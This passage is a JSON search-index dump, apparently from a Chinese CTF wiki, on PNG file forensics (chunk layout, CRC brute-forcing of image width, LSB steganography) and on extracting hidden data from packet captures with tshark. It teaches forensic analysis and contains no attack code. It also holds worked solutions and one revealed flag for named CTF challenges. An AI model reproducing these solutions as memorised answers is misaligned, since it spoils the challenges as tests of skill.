\u56fe\u50cf\u900f\u660e\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d oFFs \uff08\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u5426 \u662f \u5728IDAT\u4e4b\u524d pHYs \u7269\u7406\u50cf\u7d20\u5c3a\u5bf8\u6570\u636e\u5757 \u5426 \u662f \u5728IDAT\u4e4b\u524d sCAL \uff08\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u5426 \u662f \u5728IDAT\u4e4b\u524d IDAT \u56fe\u50cf\u6570\u636e\u5757 \u662f \u5426 \u4e0e\u5176\u4ed6IDAT\u8fde\u7eed tIME \u56fe\u50cf\u6700\u540e\u4fee\u6539\u65f6\u95f4\u6570\u636e\u5757 \u5426 \u662f \u65e0\u9650\u5236 tEXt \u6587\u672c\u4fe1\u606f\u6570\u636e\u5757 \u662f \u662f \u65e0\u9650\u5236 zTXt \u538b\u7f29\u6587\u672c\u6570\u636e\u5757 \u662f \u662f \u65e0\u9650\u5236 fRAc \uff08\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 gIFg \uff08\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 gIFt \uff08\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 gIFx \uff08\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 IEND \u56fe\u50cf\u7ed3\u675f\u6570\u636e \u5426 \u5426 \u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757 <p>\u5bf9\u4e8e\u6bcf\u4e2a\u6570\u636e\u5757\u90fd\u6709\u7740\u7edf\u4e00\u7684\u6570\u636e\u7ed3\u6784\uff0c\u6bcf\u4e2a\u6570\u636e\u5757\u7531 4 \u4e2a\u90e8\u5206\u7ec4\u6210</p> \u540d\u79f0 \u5b57\u8282\u6570 \u8bf4\u660e Length\uff08\u957f\u5ea6\uff09 4\u5b57\u8282 \u6307\u5b9a\u6570\u636e\u5757\u4e2d\u6570\u636e\u57df\u7684\u957f\u5ea6\uff0c\u5176\u957f\u5ea6\u4e0d\u8d85\u8fc7\uff08231\uff0d1\uff09\u5b57\u8282 Chunk Type Code\uff08\u6570\u636e\u5757\u7c7b\u578b\u7801\uff09 4\u5b57\u8282 \u6570\u636e\u5757\u7c7b\u578b\u7801\u7531 ASCII \u5b57\u6bcd\uff08A - Z \u548c a - z\uff09\u7ec4\u6210 Chunk Data\uff08\u6570\u636e\u5757\u6570\u636e\uff09 \u53ef\u53d8\u957f\u5ea6 \u5b58\u50a8\u6309\u7167 Chunk Type Code \u6307\u5b9a\u7684\u6570\u636e CRC\uff08\u5faa\u73af\u5197\u4f59\u68c0\u6d4b\uff09 4\u5b57\u8282 \u5b58\u50a8\u7528\u6765\u68c0\u6d4b\u662f\u5426\u6709\u9519\u8bef\u7684\u5faa\u73af\u5197\u4f59\u7801 <p>CRC\uff08Cyclic Redundancy Check\uff09\u57df\u4e2d\u7684\u503c\u662f\u5bf9 Chunk Type Code \u57df\u548c Chunk Data \u57df\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u8ba1\u7b97\u5f97\u5230\u7684\u3002</p>"},{"location":"misc/picture/png/#ihdr","title":"IHDR","text":"<p>\u6587\u4ef6\u5934\u6570\u636e\u5757 IHDR\uff08Header Chunk\uff09\uff1a\u5b83\u5305\u542b\u6709 PNG \u6587\u4ef6\u4e2d\u5b58\u50a8\u7684\u56fe\u50cf\u6570\u636e\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u7531 13 \u5b57\u8282\u7ec4\u6210\uff0c\u5e76\u8981\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u6570\u636e\u5757\u51fa\u73b0\u5728 PNG \u6570\u636e\u6d41\u4e2d\uff0c\u800c\u4e14\u4e00\u4e2a PNG \u6570\u636e\u6d41\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a\u6587\u4ef6\u5934\u6570\u636e\u5757</p> <p>\u5176\u4e2d\u6211\u4eec\u5173\u6ce8\u7684\u662f\u524d8\u5b57\u8282\u7684\u5185\u5bb9</p> \u57df\u7684\u540d\u79f0 \u5b57\u8282\u6570 \u8bf4\u660e Width 4 bytes \u56fe\u50cf\u5bbd\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d Height 4 bytes \u56fe\u50cf\u9ad8\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d <p>\u6211\u4eec\u7ecf\u5e38\u4f1a\u53bb\u66f4\u6539\u4e00\u5f20\u56fe\u7247\u7684\u9ad8\u5ea6\u6216\u8005\u5bbd\u5ea6\u4f7f\u5f97\u4e00\u5f20\u56fe\u7247\u663e\u793a\u4e0d\u5b8c\u6574\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u4fe1\u606f\u7684\u76ee\u7684\u3002</p> <p></p> <p>\u8fd9\u91cc\u53ef\u4ee5\u53d1\u73b0\u5728 Kali \u4e2d\u662f\u6253\u4e0d\u5f00\u8fd9\u5f20\u56fe\u7247\u7684\uff0c\u63d0\u793a <code>IHDR CRC error</code>\uff0c\u800c Windows 10 \u81ea\u5e26\u7684\u56fe\u7247\u67e5\u770b\u5668\u80fd\u591f\u6253\u5f00\uff0c\u5c31\u63d0\u9192\u4e86\u6211\u4eec IHDR \u5757\u88ab\u4eba\u4e3a\u7684\u7be1\u6539\u8fc7\u4e86\uff0c\u4ece\u800c\u5c1d\u8bd5\u4fee\u6539\u56fe\u7247\u7684\u9ad8\u5ea6\u6216\u8005\u5bbd\u5ea6\u53d1\u73b0\u9690\u85cf\u7684\u5b57\u7b26\u4e32\u3002</p>"},{"location":"misc/picture/png/#_2","title":"\u4f8b\u9898","text":""},{"location":"misc/picture/png/#wdctf-finals-2017","title":"WDCTF-finals-2017","text":"<p>\u89c2\u5bdf\u6587\u4ef6\u53ef\u4ee5\u53d1\u73b0,\u6587\u4ef6\u5934\u53ca\u5bbd\u5ea6\u5f02\u5e38</p> <pre><code>00000000  80 59 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.YNG........IHDR|\n00000010  00 00 00 00 00 00 02 f8  08 06 00 00 00 93 2f 8a  |............../.|\n00000020  6b 00 00 00 04 67 41 4d  41 00 00 9c 40 20 0d e4  |k....gAMA...@ ..|\n00000030  cb 00 00 00 20 63 48 52  4d 00 00 87 0f 00 00 8c  |.... cHRM.......|\n00000040  0f 00 00 fd 52 00 00 81  40 00 00 7d 79 00 00 e9  |....R...@..}y...|\n...\n</code></pre> <p>\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6587\u4ef6\u5bbd\u5ea6\u4e0d\u80fd\u4efb\u610f\u4fee\u6539\uff0c\u9700\u8981\u6839\u636e IHDR \u5757\u7684 CRC \u503c\u7206\u7834\u5f97\u5230\u5bbd\u5ea6,\u5426\u5219\u56fe\u7247\u663e\u793a\u9519\u8bef\u4e0d\u80fd\u5f97\u5230 flag\u3002</p> <pre><code>import os\nimport binascii\nimport struct\n\n\nmisc = open(\"misc4.png\",\"rb\").read()\n\nfor i in range(1024):\n    data = misc[12:16] + struct.pack('&gt;i',i)+ misc[20:29]\n    crc32 = binascii.crc32(data) &amp; 0xffffffff\n    if crc32 == 0x932f8a6b:\n        print i\n</code></pre> <p>\u5f97\u5230\u5bbd\u5ea6\u503c\u4e3a 709 \u540e\uff0c\u6062\u590d\u56fe\u7247\u5f97\u5230 flag\u3002</p> <p></p>"},{"location":"misc/picture/png/#plte","title":"PLTE","text":"<p>\u8c03\u8272\u677f\u6570\u636e\u5757 PLTE\uff08palette chunk\uff09\uff1a\u5b83\u5305\u542b\u6709\u4e0e\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\uff08indexed-color image\uff09\u76f8\u5173\u7684\u5f69\u8272\u53d8\u6362\u6570\u636e\uff0c\u5b83\u4ec5\u4e0e\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\u6709\u5173\uff0c\u800c\u4e14\u8981\u653e\u5728\u56fe\u50cf\u6570\u636e\u5757\uff08image data chunk\uff09\u4e4b\u524d\u3002\u771f\u5f69\u8272\u7684 PNG \u6570\u636e\u6d41\u4e5f\u53ef\u4ee5\u6709\u8c03\u8272\u677f\u6570\u636e\u5757\uff0c\u76ee\u7684\u662f\u4fbf\u4e8e\u975e\u771f\u5f69\u8272\u663e\u793a\u7a0b\u5e8f\u7528\u5b83\u6765\u91cf\u5316\u56fe\u50cf\u6570\u636e\uff0c\u4ece\u800c\u663e\u793a\u8be5\u56fe\u50cf\u3002</p>"},{"location":"misc/picture/png/#idat","title":"IDAT","text":"<p>\u56fe\u50cf\u6570\u636e\u5757 IDAT\uff08image data chunk\uff09\uff1a\u5b83\u5b58\u50a8\u5b9e\u9645\u7684\u6570\u636e\uff0c\u5728\u6570\u636e\u6d41\u4e2d\u53ef\u5305\u542b\u591a\u4e2a\u8fde\u7eed\u987a\u5e8f\u7684\u56fe\u50cf\u6570\u636e\u5757\u3002</p> <ul> <li>\u50a8\u5b58\u56fe\u50cf\u50cf\u6570\u6570\u636e</li> <li>\u5728\u6570\u636e\u6d41\u4e2d\u53ef\u5305\u542b\u591a\u4e2a\u8fde\u7eed\u987a\u5e8f\u7684\u56fe\u50cf\u6570\u636e\u5757</li> <li>\u91c7\u7528 LZ77 \u7b97\u6cd5\u7684\u6d3e\u751f\u7b97\u6cd5\u8fdb\u884c\u538b\u7f29</li> <li>\u53ef\u4ee5\u7528 zlib \u89e3\u538b\u7f29</li> </ul> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cIDAT \u5757\u53ea\u6709\u5f53\u4e0a\u4e00\u4e2a\u5757\u5145\u6ee1\u65f6\uff0c\u624d\u4f1a\u7ee7\u7eed\u4e00\u4e2a\u65b0\u7684\u5757\u3002</p> <p>\u7528 <code>pngcheck</code> \u53bb\u67e5\u770b\u6b64 PNG \u6587\u4ef6</p> <pre><code>\u03bb .\\pngcheck.exe -v sctf.png\nFile: sctf.png (1421461 bytes)\nchunk IHDR at offset 0x0000c, length 13\n1000 x 562 image, 32-bit RGB+alpha, non-interlaced\n  chunk sRGB at offset 0x00025, length 1\nrendering intent = perceptual\n  chunk gAMA at offset 0x00032, length 4: 0.45455\n  chunk pHYs at offset 0x00042, length 9: 3780x3780 pixels/meter (96 dpi)\nchunk IDAT at offset 0x00057, length 65445\nzlib: deflated, 32K window, fast compression\n  chunk IDAT at offset 0x10008, length 65524\n...\n  chunk IDAT at offset 0x150008, length 45027\nchunk IDAT at offset 0x15aff7, length 138\nchunk IEND at offset 0x15b08d, length 0\nNo errors detected in sctf.png (28 chunks, 36.8% compression).\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6b63\u5e38\u7684\u5757\u7684 length \u662f\u5728 65524 \u7684\u65f6\u5019\u5c31\u6ee1\u4e86\uff0c\u800c\u5012\u6570\u7b2c\u4e8c\u4e2a IDAT \u5757\u957f\u5ea6\u662f 45027\uff0c\u6700\u540e\u4e00\u4e2a\u957f\u5ea6\u662f 138\uff0c\u5f88\u660e\u663e\u6700\u540e\u4e00\u4e2a IDAT \u5757\u662f\u6709\u95ee\u9898\u7684\uff0c\u56e0\u4e3a\u4ed6\u672c\u6765\u5e94\u8be5\u5e76\u5165\u5230\u5012\u6570\u7b2c\u4e8c\u4e2a\u672a\u6ee1\u7684\u5757\u91cc.</p> <p>\u5229\u7528 <code>python zlib</code> \u89e3\u538b\u591a\u4f59 IDAT \u5757\u7684\u5185\u5bb9\uff0c\u6b64\u65f6\u6ce8\u610f\u5254\u9664 \u957f\u5ea6\u3001\u6570\u636e\u5757\u7c7b\u578b\u53ca\u672b\u5c3e\u7684CRC\u6821\u9a8c\u503c\u3002</p> <pre><code>import zlib\nimport binascii\nIDAT = \"789...667\".decode('hex')\nresult = binascii.hexlify(zlib.decompress(IDAT))\nprint result\n</code></pre>"},{"location":"misc/picture/png/#iend","title":"IEND","text":"<p>\u56fe\u50cf\u7ed3\u675f\u6570\u636e IEND\uff08image trailer chunk\uff09\uff1a\u5b83\u7528\u6765\u6807\u8bb0 PNG \u6587\u4ef6\u6216\u8005\u6570\u636e\u6d41\u5df2\u7ecf\u7ed3\u675f\uff0c\u5e76\u4e14\u5fc5\u987b\u8981\u653e\u5728\u6587\u4ef6\u7684\u5c3e\u90e8\u3002</p> <pre><code>00 00 00 00 49 45 4E 44 AE 42 60 82\n</code></pre> <p>IEND \u6570\u636e\u5757\u7684\u957f\u5ea6\u603b\u662f <code>00 00 00 00</code>\uff0c\u6570\u636e\u6807\u8bc6\u603b\u662f IEND <code>49 45 4E 44</code>\uff0c\u56e0\u6b64\uff0cCRC \u7801\u4e5f\u603b\u662f <code>AE 42 60 82</code>\u3002</p>"},{"location":"misc/picture/png/#_3","title":"\u5176\u4f59\u8f85\u52a9\u6570\u636e\u5757","text":"<ul> <li>\u80cc\u666f\u989c\u8272\u6570\u636e\u5757 bKGD\uff08background color\uff09</li> <li>\u57fa\u8272\u548c\u767d\u8272\u5ea6\u6570\u636e\u5757 cHRM\uff08primary chromaticities and white point\uff09\uff0c\u6240\u8c13\u767d\u8272\u5ea6\u662f\u6307\u5f53 <code>R\uff1dG\uff1dB\uff1d\u6700\u5927\u503c</code> \u65f6\u5728\u663e\u793a\u5668\u4e0a\u4ea7\u751f\u7684\u767d\u8272\u5ea6</li> <li>\u56fe\u50cf \u03b3 \u6570\u636e\u5757 gAMA\uff08image gamma\uff09</li> <li>\u56fe\u50cf\u76f4\u65b9\u56fe\u6570\u636e\u5757 hIST\uff08image histogram\uff09</li> <li>\u7269\u7406\u50cf\u7d20\u5c3a\u5bf8\u6570\u636e\u5757 pHYs\uff08physical pixel dimensions\uff09</li> <li>\u6837\u672c\u6709\u6548\u4f4d\u6570\u636e\u5757 sBIT\uff08significant bits\uff09</li> <li>\u6587\u672c\u4fe1\u606f\u6570\u636e\u5757 tEXt\uff08textual data\uff09</li> <li>\u56fe\u50cf\u6700\u540e\u4fee\u6539\u65f6\u95f4\u6570\u636e\u5757 tIME \uff08image last-modification time\uff09</li> <li>\u56fe\u50cf\u900f\u660e\u6570\u636e\u5757 tRNS \uff08transparency\uff09</li> <li>\u538b\u7f29\u6587\u672c\u6570\u636e\u5757 zTXt \uff08compressed textual data\uff09</li> </ul>"},{"location":"misc/picture/png/#lsb","title":"LSB","text":"<p>LSB \u5168\u79f0 Least Significant Bit\uff0c\u6700\u4f4e\u6709\u6548\u4f4d\u3002PNG \u6587\u4ef6\u4e2d\u7684\u56fe\u50cf\u50cf\u6570\u4e00\u822c\u662f\u7531 RGB \u4e09\u539f\u8272\uff08\u7ea2\u7eff\u84dd\uff09\u7ec4\u6210\uff0c\u6bcf\u4e00\u79cd\u989c\u8272\u5360\u7528 8 \u4f4d\uff0c\u53d6\u503c\u8303\u56f4\u4e3a <code>0x00</code> \u81f3 <code>0xFF</code>\uff0c\u5373\u6709 256 \u79cd\u989c\u8272\uff0c\u4e00\u5171\u5305\u542b\u4e86 256 \u7684 3 \u6b21\u65b9\u7684\u989c\u8272\uff0c\u5373 16777216 \u79cd\u989c\u8272\u3002</p> <p>\u800c\u4eba\u7c7b\u7684\u773c\u775b\u53ef\u4ee5\u533a\u5206\u7ea61000\u4e07\u79cd\u4e0d\u540c\u7684\u989c\u8272\uff0c\u610f\u5473\u7740\u4eba\u7c7b\u7684\u773c\u775b\u65e0\u6cd5\u533a\u5206\u4f59\u4e0b\u7684\u989c\u8272\u5927\u7ea6\u67096777216\u79cd\u3002</p> <p>LSB \u9690\u5199\u5c31\u662f\u4fee\u6539 RGB \u989c\u8272\u5206\u91cf\u7684\u6700\u4f4e\u4e8c\u8fdb\u5236\u4f4d\uff08LSB\uff09\uff0c\u6bcf\u4e2a\u989c\u8272\u4f1a\u6709 8 bit\uff0cLSB \u9690\u5199\u5c31\u662f\u4fee\u6539\u4e86\u50cf\u6570\u4e2d\u7684\u6700\u4f4e\u7684 1 bit\uff0c\u800c\u4eba\u7c7b\u7684\u773c\u775b\u4e0d\u4f1a\u6ce8\u610f\u5230\u8fd9\u524d\u540e\u7684\u53d8\u5316\uff0c\u6bcf\u4e2a\u50cf\u7d20\u53ef\u4ee5\u643a\u5e26 3 \u6bd4\u7279\u7684\u4fe1\u606f\u3002</p> <p></p> <p>\u5982\u679c\u662f\u8981\u5bfb\u627e\u8fd9\u79cd LSB \u9690\u85cf\u75d5\u8ff9\u7684\u8bdd\uff0c\u6709\u4e00\u4e2a\u5de5\u5177 Stegsolve \u662f\u4e2a\u795e\u5668\uff0c\u53ef\u4ee5\u6765\u8f85\u52a9\u6211\u4eec\u8fdb\u884c\u5206\u6790\u3002</p> <p>\u901a\u8fc7\u4e0b\u65b9\u7684\u6309\u94ae\u53ef\u4ee5\u89c2\u5bdf\u6bcf\u4e2a\u901a\u9053\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u67e5\u770b R \u901a\u9053\u7684\u6700\u4f4e\u4f4d\u7b2c 8 \u4f4d\u5e73\u9762\u7684\u4fe1\u606f\u3002</p> <p></p> <p>LSB \u7684\u4fe1\u606f\u501f\u52a9\u4e8e Stegsolve \u67e5\u770b\u5404\u4e2a\u901a\u9053\u65f6\u4e00\u5b9a\u8981\u7ec6\u5fc3\u6355\u6349\u5f02\u5e38\u70b9\uff0c\u6293\u4f4f LSB \u9690\u5199\u7684\u86db\u4e1d\u9a6c\u8ff9\u3002</p>"},{"location":"misc/picture/png/#_4","title":"\u4f8b\u9898","text":"<p>HCTF - 2016 - Misc</p> <p>\u8fd9\u9898\u7684\u4fe1\u606f\u9690\u85cf\u5728 RGB \u4e09\u4e2a\u901a\u9053\u7684\u6700\u4f4e\u4f4d\u4e2d\uff0c\u501f\u52a9 <code>Stegsolve--&gt;Analyse--&gt;Data Extract</code> \u53ef\u4ee5\u6307\u5b9a\u901a\u9053\u8fdb\u884c\u63d0\u53d6\u3002</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0 <code>zip</code> \u5934\uff0c\u7528 <code>save bin</code> \u4fdd\u5b58\u4e3a\u538b\u7f29\u5305\u540e\uff0c\u6253\u5f00\u8fd0\u884c\u5176\u4e2d\u7684 ELF \u6587\u4ef6\u5c31\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684 flag\u3002</p> <p>\u66f4\u591a\u5173\u4e8e LSB \u7684\u7814\u7a76\u53ef\u4ee5\u770b \u8fd9\u91cc\u3002</p>"},{"location":"misc/picture/png/#_5","title":"\u9690\u5199\u8f6f\u4ef6","text":"<p>Stepic</p>"},{"location":"misc/traffic/data/","title":"\u6570\u636e\u63d0\u53d6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u4e00\u5757\u662f\u6d41\u91cf\u5305\u4e2d\u53e6\u4e00\u4e2a\u91cd\u70b9,\u901a\u8fc7\u5bf9\u534f\u8bae\u5206\u6790,\u627e\u5230\u4e86\u9898\u76ee\u7684\u5173\u952e\u70b9,\u5982\u4f55\u63d0\u53d6\u6570\u636e\u6210\u4e86\u63a5\u4e0b\u6765\u7684\u5173\u952e\u95ee\u9898</p>"},{"location":"misc/traffic/data/#wireshark","title":"wireshark","text":""},{"location":"misc/traffic/data/#wireshark_1","title":"wireshark\u81ea\u52a8\u5206\u6790","text":"<p><code>file -&gt; export objects -&gt; http</code></p>"},{"location":"misc/traffic/data/#_2","title":"\u624b\u52a8\u6570\u636e\u63d0\u53d6","text":"<p><code>file-&gt;export selected Packet Bytes</code></p>"},{"location":"misc/traffic/data/#tshark","title":"tshark","text":"<p>tshark\u4f5c\u4e3awireshark\u7684\u547d\u4ee4\u884c\u7248,\u9ad8\u6548\u5feb\u6377\u662f\u5b83\u7684\u4f18\u70b9,\u914d\u5408\u5176\u4f59\u547d\u4ee4\u884c\u5de5\u5177(awk,grep)\u7b49\u7075\u6d3b\u4f7f\u7528,\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d,\u63d0\u53d6\u6570\u636e\u4ece\u800c\u7701\u53bb\u4e86\u7e41\u6742\u7684\u811a\u672c\u7f16\u5199</p> <p>\u518d\u770b<code>Google CTF 2016 Forensic-200</code>\u8fd9\u4e00\u9898,\u53ef\u4ee5\u901a\u8fc7tshark\u8fc5\u901f\u5b8c\u6210\u89e3\u9898</p> <pre><code>what@kali:/tmp$ tshark -r capture.pcapng -T fields -e usb.capdata &gt; data2.txt\nwhat@kali:/tmp$ # awk -F: 'function comp(v){if(v&gt;127)v-=256;return v}{x+=comp(strtonum(\"0x\"$2));y+=comp(strtonum(\"0x\"$3))}$1==\"01\"{print x,y}' data.txt &gt; data3.txt\nwhat@kali:/tmp$ gnuplot\n&gt; plot \"data3.txt\"\n</code></pre> <ul> <li>Step 1 \u9f20\u6807\u534f\u8bae\u4e2d\u6570\u636e\u63d0\u53d6</li> <li>Step 2 \u901a\u8fc7awk\u8fdb\u884c\u4f4d\u7f6e\u5750\u6807\u8f6c\u6362</li> <li>Step 3 \u5f62\u6210\u56fe\u5f62</li> </ul>"},{"location":"misc/traffic/data/#_3","title":"\u5e38\u7528\u65b9\u6cd5","text":"<p><code>tshark -r **.pcap \u2013Y ** -T fields \u2013e ** | **** &gt; data</code></p> <pre><code>Usage:\n  -Y &lt;display filter&gt;      packet displaY filter in Wireshark display filter\n                           syntax\n  -T pdml|ps|psml|json|jsonraw|ek|tabs|text|fields|?\n                           format of text output (def: text)\n  -e &lt;field&gt;               field to print if -Tfields selected (e.g. tcp.port,\n                           _ws.col.Info)\n</code></pre> <p>\u901a\u8fc7<code>-Y</code>\u8fc7\u6ee4\u5668(\u4e0ewireshark\u4e00\u81f4),\u7136\u540e\u7528<code>-T filds -e</code>\u914d\u5408\u6307\u5b9a\u663e\u793a\u7684\u6570\u636e\u6bb5(\u6bd4\u5982usb.capdata)</p> <ul> <li><code>tips</code><ul> <li><code>-e</code>\u540e\u7684\u53c2\u6570\u4e0d\u786e\u5b9a\u53ef\u4ee5\u7531 <code>wireshark</code> \u53f3\u51fb\u9700\u8981\u7684\u6570\u636e\u9009\u4e2d\u540e\u5f97\u5230</li> </ul> </li> </ul>"},{"location":"misc/traffic/data/#_4","title":"\u4f8b\u9898","text":"<p>\u9898\u76ee\uff1a<code>google-ctf-2016 : a-cute-stegosaurus-100</code></p> <p>\u8fd9\u9898\u7684\u6570\u636e\u9690\u85cf\u7684\u975e\u5e38\u5de7\u5999,\u800c\u4e14\u6709\u4e00\u5f20\u56fe\u7247\u6df7\u6dc6\u89c6\u542c,\u9700\u8981\u5bf9<code>tcp</code>\u534f\u8bae\u975e\u5e38\u719f\u6089,\u6240\u4ee5\u5f53\u65f6\u505a\u51fa\u6765\u7684\u4eba\u5e76\u4e0d\u591a,\u5168\u7403\u53ea\u6709 <code>26</code> \u652f\u961f\u4f0d</p> <p>\u5728<code>tcp</code>\u62a5\u6587\u6bb5\u4e2d\u67096Bit\u7684\u72b6\u6001\u63a7\u5236\u7801,\u5206\u522b\u5982\u4e0b</p> <ul> <li>URG\uff1a\u7d27\u6025\u6bd4\u7279\uff08urgent\uff09,\u5f53URG\uff1d1\u65f6\uff0c\u8868\u660e\u7d27\u6025\u6307\u9488\u5b57\u6bb5\u6709\u6548,\u4ee3\u8868\u8be5\u5c01\u5305\u4e3a\u7d27\u6025\u5c01\u5305\u3002\u5b83\u544a\u8bc9\u7cfb\u7edf\u6b64\u62a5\u6587\u6bb5\u4e2d\u6709\u7d27\u6025\u6570\u636e\uff0c\u5e94\u5c3d\u5feb\u4f20\u9001(\u76f8\u5f53\u4e8e\u9ad8\u4f18\u5148\u7ea7\u7684\u6570\u636e)</li> <li>ACK\uff1a\u786e\u8ba4\u6bd4\u7279\uff08Acknowledge\uff09\u3002\u53ea\u6709\u5f53ACK\uff1d1\u65f6\u786e\u8ba4\u53f7\u5b57\u6bb5\u624d\u6709\u6548,\u4ee3\u8868\u8fd9\u4e2a\u5c01\u5305\u4e3a\u786e\u8ba4\u5c01\u5305\u3002\u5f53ACK\uff1d0\u65f6\uff0c\u786e\u8ba4\u53f7\u65e0\u6548\u3002</li> <li>PSH\uff1a\uff08Push function\uff09\u82e5\u4e3a1\u65f6\uff0c\u4ee3\u8868\u8981\u6c42\u5bf9\u65b9\u7acb\u5373\u4f20\u9001\u7f13\u51b2\u533a\u5185\u7684\u5176\u4ed6\u5bf9\u5e94\u5c01\u5305\uff0c\u800c\u65e0\u9700\u7b49\u7f13\u51b2\u6ee1\u4e86\u624d\u9001\u3002</li> <li>RST\uff1a\u590d\u4f4d\u6bd4\u7279(Reset) ,\u5f53RST\uff1d1\u65f6\uff0c\u8868\u660eTCP\u8fde\u63a5\u4e2d\u51fa\u73b0\u4e25\u91cd\u5dee\u9519\uff08\u5982\u7531\u4e8e\u4e3b\u673a\u5d29\u6e83\u6216\u5176\u4ed6\u539f\u56e0\uff09\uff0c\u5fc5\u987b\u91ca\u653e\u8fde\u63a5\uff0c\u7136\u540e\u518d\u91cd\u65b0\u5efa\u7acb\u8fd0\u8f93\u8fde\u63a5\u3002</li> <li>SYN\uff1a\u540c\u6b65\u6bd4\u7279(Synchronous)\uff0cSYN\u7f6e\u4e3a1\uff0c\u5c31\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\u6216\u8fde\u63a5\u63a5\u53d7\u62a5\u6587,\u901a\u5e38\u5e26\u6709 SYN \u6807\u5fd7\u7684\u5c01\u5305\u8868\u793a\u300e\u4e3b\u52a8\u300f\u8981\u8fde\u63a5\u5230\u5bf9\u65b9\u7684\u610f\u601d\u3002\u3002</li> <li>FIN\uff1a\u7ec8\u6b62\u6bd4\u7279(Final)\uff0c\u7528\u6765\u91ca\u653e\u4e00\u4e2a\u8fde\u63a5\u3002\u5f53FIN\uff1d1\u65f6\uff0c\u8868\u660e\u6b64\u62a5\u6587\u6bb5\u7684\u53d1\u9001\u7aef\u7684\u6570\u636e\u5df2\u53d1\u9001\u5b8c\u6bd5\uff0c\u5e76\u8981\u6c42\u91ca\u653e\u8fd0\u8f93\u8fde\u63a5\u3002</li> </ul> <p>\u800c\u8fd9\u91cc\u7684<code>tcp.urg</code>\u5374\u4e3a</p> <p></p> <p>\u901a\u8fc7tshark\u63d0\u53d6<code>tcp.urg</code>\u7136\u540e\u53bb\u96640\u7684\u5b57\u6bb5,\u6362\u884c\u7b26\u8f6c<code>,</code>\u76f4\u63a5\u8f6c\u6362\u6210python\u7684\u5217\u8868,\u8f6cascii\u5373\u53ef\u5f97\u5230flag</p> <pre><code>\u26a1 root@kali:  tshark -r Stego-200_urg.pcap -T fields -e  tcp.urgent_pointer|egrep -vi \"^0$\"|tr '\\n' ','\nRunning as user \"root\" and group \"root\". This could be dangerous.\n67,84,70,123,65,110,100,95,89,111,117,95,84,104,111,117,103,104,116,95,73,116,95,87,97,115,95,73,110,95,84,104,101,95,80,105,99,116,117,114,101,125,#\n...\n&gt;&gt;&gt; print \"\".join([chr(x) for x in arr]) #python\u8f6c\u6362ascii\nCTF{And_You_Thought_It_Was_In_The_Picture}\n</code></pre> <p>\u9898\u76ee\uff1a<code>stego-150_ears.xz</code></p> <p>Step 1</p> <p>\u901a\u8fc7<code>file</code>\u547d\u4ee4\u4e0d\u65ad\u89e3\u538b\u5f97\u5230 <code>pcap</code> \u6587\u4ef6</p> <pre><code>\u279c  Desktop file ears\nears: XZ compressed data\n\u279c  Desktop unxz &lt; ears &gt; file_1\n\u279c  Desktop file file_1\nfile_1: POSIX tar archive\n\u279c  Desktop 7z x file_1\n\n7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21\np7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-4710MQ CPU @ 2.50GHz (306C3),ASM,AES-NI)\n\nScanning the drive for archives:\n    1 file, 4263936 bytes (4164 KiB)\n\nExtracting archive: file_1\n    --\n    Path = file_1\n    Type = tar\n    Physical Size = 4263936\nHeaders Size = 1536\nCode Page = UTF-8\n\n    Everything is Ok\n\n    Size:       4262272\nCompressed: 4263936\n</code></pre> <p>Step 2</p> <p>\u901a\u8fc7 <code>wireshark</code> \u53d1\u73b0 <code>dns</code> \u4e2d\u56de\u5e94\u540d\u5b57\u5b58\u5728\u5f02\u5e38\uff0c\u7ec4\u6210 <code>16</code> \u8fdb\u5236\u7684 <code>png</code> \u6587\u4ef6</p> <p>\u91c7\u7528 <code>tshark</code> \u8fdb\u884c\u63d0\u53d6\uff0c\u63d0\u53d6 <code>dns</code> \u4e2d\u7684\u6570\u636e,\u7b5b\u9009\u5177\u4f53\u62a5\u6587\u5f62\u5f0f<code>\\w{4,}.asis.io</code></p> <p><code>tshark -r forensic_175_d78a42edc01c9104653776f16813d9e5 -T fields -e dns.qry.name -e dns.flags|grep 8180|awk '{if ($1~/\\w{4,}.asis.io/) print $1}'|awk -F '.' '{print $1}'|tr -d '\\n' &gt; png</code></p> <p>Step 3</p> <p><code>16</code> \u8fdb\u5236\u8fd8\u539f\u56fe\u7247</p> <p><code>xxd -p -r png 